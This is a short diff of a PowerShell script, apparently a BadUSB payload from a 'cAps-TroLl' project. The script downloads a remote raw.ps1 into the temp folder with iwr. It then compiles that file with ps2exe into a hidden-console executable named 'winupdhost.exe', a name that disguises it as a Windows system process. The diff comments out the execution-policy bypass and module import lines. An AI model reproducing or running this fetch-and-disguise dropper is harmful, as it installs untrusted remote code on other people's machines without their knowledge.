@@ -1,8 +1,8 @@
 cd $env:Temp;
 iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/raw.ps1 -O raw.ps1;
 Start-Sleep 1;
-Set-ExecutionPolicy -ExecutionPolicy Bypass;
-Import-Module ps2exe;
+#+Set-ExecutionPolicy -ExecutionPolicy Bypass;
+#Import-Module ps2exe;
 Start-Sleep 1;
 ps2exe.ps1 raw.ps1 winupdhost.exe -noConsole;
 Start-Sleep 1;
